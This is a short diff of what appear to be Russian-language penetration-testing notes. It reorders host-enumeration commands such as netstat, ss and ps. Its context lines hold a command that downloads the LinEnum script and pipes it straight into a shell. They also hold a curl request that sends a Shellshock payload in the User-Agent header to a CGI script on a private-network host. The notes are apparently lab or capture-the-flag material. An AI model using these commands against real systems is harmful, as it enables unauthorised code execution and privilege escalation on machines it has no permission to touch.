@@ -24,11 +24,12 @@ wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh | sh
 
        сетевые интерфейсы, порты, службы;
        netstat
-       
-       процессы
+            
        ss -tulpn
 
-
+        процессы
+        ps aux
+        
         
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
